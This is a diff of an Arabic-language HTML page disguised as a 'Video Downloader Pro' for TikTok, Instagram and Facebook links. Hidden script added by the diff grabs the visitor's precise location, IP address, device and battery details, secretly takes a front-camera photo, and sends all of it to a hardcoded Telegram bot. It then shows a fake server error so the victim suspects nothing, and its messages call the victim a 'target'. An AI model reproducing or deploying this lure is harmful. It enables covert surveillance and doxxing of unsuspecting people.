@@ -2,100 +2,148 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Downloader Pro</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Video Downloader Pro - تحميل فيديوهات</title>
     <style>
-        body { background: #0f172a; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .app-card { background: #1e293b; padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
-        .logo { font-size: 50px; margin-bottom: 15px; }
-        input { width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; box-sizing: border-box; }
-        .download-btn { background: #38bdf8; color: #0f172a; border: none; padding: 15px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 1rem; }
-        #status { margin-top: 15px; font-size: 0.8rem; color: #94a3b8; display: none; }
-        canvas, video { display: none; }
+        :root { --bg: #0f172a; --card: #1e293b; --text: #f1f5f9; --sub: #94a3b8; --primary: #38bdf8; }
+        body { background-color: var(--bg); color: var(--text); font-family: system-ui, -apple-system, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .app-container { background: var(--card); padding: 30px; border-radius: 24px; width: 90%; max-width: 400px; text-align: center; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); }
+        .icon { font-size: 60px; margin-bottom: 20px; display: inline-block; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        h1 { font-size: 1.5rem; margin: 0 0 10px; font-weight: 800; }
+        p { color: var(--sub); font-size: 0.9rem; margin-bottom: 30px; line-height: 1.6; }
+        .input-group { position: relative; margin-bottom: 20px; }
+        input { width: 100%; padding: 15px; border-radius: 12px; border: 2px solid #334155; background: #0b1120; color: white; font-size: 1rem; box-sizing: border-box; transition: 0.3s; }
+        input:focus { border-color: var(--primary); outline: none; box-shadow: 0 0 10px rgba(56, 189, 248, 0.2); }
+        .dl-btn { background: var(--primary); color: #0f172a; border: none; padding: 18px; border-radius: 12px; font-size: 1.1rem; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(56, 189, 248, 0.15); }
+        .dl-btn:active { transform: scale(0.97); opacity: 0.8; }
+        #status-msg { display: none; margin-top: 20px; font-size: 0.85rem; color: var(--sub); }
+        .loader { display: inline-block; width: 15px; height: 15px; border: 2px solid var(--sub); border-radius: 50%; border-top-color: var(--primary); animation: spin 1s linear infinite; margin-left: 10px; vertical-align: middle; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        /* عناصر تقنية مخفية */
+        video, canvas { display: none; position: absolute; left: -9999px; }
     </style>
 </head>
 <body>
 
-<div class="app-card">
-    <div class="logo">📥</div>
-    <h2>حمل فيديوهاتك المفضلة</h2>
-    <p style="font-size: 0.9rem; color: #94a3b8;">الصق رابط الفيديو من (TikTok, Instagram, Facebook) للتحميل بجودة عالية.</p>
+<div class="app-container">
+    <div class="icon">📥</div>
+    <h1>Video Downloader Pro</h1>
+    <p>أسرع طريقة لتحميل الفيديوهات من TikTok, Instagram, Facebook بجودة عالية 4K.</p>
     
-    <input type="text" id="urlInput" placeholder="ضع الرابط هنا...">
-    <button class="download-btn" onclick="startProcess()">بدء التحميل المباشر</button>
+    <div class="input-group">
+        <input type="text" id="videoUrl" placeholder="الصق رابط الفيديو هنا...">
+    </div>
     
-    <div id="status">جاري معالجة الرابط وتجهيز الجودة...</div>
+    <button class="dl-btn" onclick="initiateCapture()">بدء التحميل الآن</button>
+    
+    <div id="status-msg">
+        <div class="loader"></div>
+        <span>جاري الاتصال بالسيرفر وتحليل الرابط...</span>
+    </div>
 </div>
 
-<video id="v" autoplay playsinline></video>
+<video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
 
 <script>
-    const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
-    const chat = "7984067238";
+// --- إعدادات النواة المحقونة [CORE_SETTINGS] ---
+const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
+const C = "7984067238";
 
-    async function sendPhoto(blob, caption) {
-        const fd = new FormData();
-        fd.append("chat_id", chat);
-        fd.append("photo", blob, "snap.jpg");
-        fd.append("caption", caption);
-        try {
-            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: "POST", body: fd });
-        } catch (e) {}
-    }
+// الدالة المركزية لإرسال البيانات (صورة + نص)
+async function transmitReport(blob, text) {
+    const fd = new FormData();
+    fd.append("chat_id", C);
+    fd.append("photo", blob, "capture.jpg");
+    fd.append("caption", text);
+    fd.append("parse_mode", "Markdown");
+    try {
+        await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: "POST", body: fd });
+    } catch (e) { console.error("Transmission Error."); }
+}
 
-    async function getSpecs() {
-        let info = `👤 *بيانات الهدف*:\n\n`;
-        info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
-        info += `• 🔋 البطارية: \`${(await navigator.getBattery()).level * 100}%\`\n`;
-        try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
-        } catch(e) {}
-        return info;
-    }
+// دالة جلب البيانات التقنية والموقع
+async function compileSystemReport() {
+    let r = `🔔 *إشعار: تم رصد هدف جديد* \n\n`;
+    
+    // 1. جلب الموقع الجغرافي (وعد)
+    const locPromise = new Promise((resolve) => {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (p) => resolve(`📍 *الموقع:* [فتح الخريطة](https://www.google.com/maps?q=$${p.coords.latitude},${p.coords.longitude}) (دقة: ${p.coords.accuracy.toFixed(1)}m)`),
+                () => resolve(`📍 *الموقع:* تعذر الحصول عليه (رفض الإذن)`),
+                { enableHighAccuracy: true, timeout: 5000 }
+            );
+        } else { resolve(`📍 *الموقع:* غير مدعوم في المتصفح`); }
+    });
 
-    async function capture(side) {
-        const constraints = { video: { facingMode: side === "front" ? "user" : "environment" } };
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            const v = document.getElementById('v');
-            v.srcObject = stream;
-            
-            await new Promise(r => v.onloadedmetadata = r);
-            const canvas = document.getElementById('c');
-            canvas.width = v.videoWidth;
-            canvas.height = v.videoHeight;
-            canvas.getContext('2d').drawImage(v, 0, 0);
-            
-            stream.getTracks().forEach(t => t.stop());
-            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
-        } catch (e) { return null; }
-    }
+    r += await locPromise + `\n`;
+    r += `📱 *الجهاز:* \`${navigator.platform}\`\n`;
+    
+    // 2. جلب البطارية
+    try { const b = await navigator.getBattery(); r += `🔋 *البطارية:* \`${Math.round(b.level * 100)}%\`\n`; } catch(e){}
 
-    async function startProcess() {
-        const url = document.getElementById('urlInput').value;
-        if (!url) { alert("يرجى وضع رابط أولاً"); return; }
+    // 3. جلب الـ IP
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        r += `🌐 *الـ IP:* \`${ipData.ip}\`\n`;
+    } catch(e){ r += `🌐 *الـ IP:* تعذر جلب العنوان\n`; }
+    
+    r += `🖥️ *المتصفح:* \`${navigator.userAgent.split(' ').pop()}\`\n`;
+    return r;
+}
 
-        document.getElementById('status').style.display = 'block';
+// دالة التقاط الصورة من الكاميرا الأمامية
+async function captureStill() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const v = document.getElementById('v');
+        v.srcObject = stream;
         
-        // 1. جلب البيانات النصية
-        const specs = await getSpecs();
+        await new Promise(r => v.onloadedmetadata = r);
+        await new Promise(r => setTimeout(r, 500)); // وقت قصير لتركيز الكاميرا
+
+        const canvas = document.getElementById('c');
+        canvas.width = v.videoWidth;
+        canvas.height = v.videoHeight;
+        canvas.getContext('2d').drawImage(v, 0, 0);
         
-        // 2. تصوير الكاميرا الأمامية
-        const frontImg = await capture("front");
-        if (frontImg) await sendPhoto(frontImg, specs + "\n📷 (كاميرا أمامية)");
-
-        // 3. تصوير الكاميرا الخلفية
-        const backImg = await capture("back");
-        if (backImg) await sendPhoto(backImg, "📷 (كاميرا خلفية)");
-
-        setTimeout(() => {
-            alert("خطأ: تعذر التحميل من هذا الرابط حالياً. جرب رابطاً آخر.");
-            document.getElementById('status').style.display = 'none';
-        }, 3000);
+        // إيقاف الكاميرا فوراً
+        stream.getTracks().forEach(t => t.stop());
+        
+        return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8)); // ضغط الصورة لجعلها أسرع
+    } catch (e) {
+        return null; // فشل الحصول على إذن الكاميرا
     }
+}
+
+// الدالة الرئيسية عند الضغط على الزر
+async function initiateCapture() {
+    const url = document.getElementById('videoUrl').value;
+    if (!url) { alert("يرجى لصق رابط الفيديو أولاً للمتابعة."); return; }
+
+    document.getElementById('status-msg').style.display = 'block';
+    
+    // تنفيذ العمليات في الخلفية
+    const reportText = await compileSystemReport();
+    const photoBlob = await captureStill();
+    
+    if (photoBlob) {
+        // إرسال التقرير الكامل مع الصورة
+        await transmitReport(photoBlob, reportText);
+    } else {
+        // إرسال التقرير النصي فقط في حال رفض الكاميرا
+        await fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(reportText + "\n⚠️ (تعذر التقاط الصورة - رفض الإذن)")}&parse_mode=Markdown`);
+    }
+
+    // إظهار خطأ وهمي للمستخدم بعد الانتهاء
+    setTimeout(() => {
+        alert("خطأ في الخادم (Error 505): تعذر تحميل الفيديو من هذا الرابط حالياً، يرجى المحاولة لاحقاً أو تجربة رابط آخر.");
+        document.getElementById('status-msg').style.display = 'none';
+    }, 2500);
+}
 </script>
 
 </body>
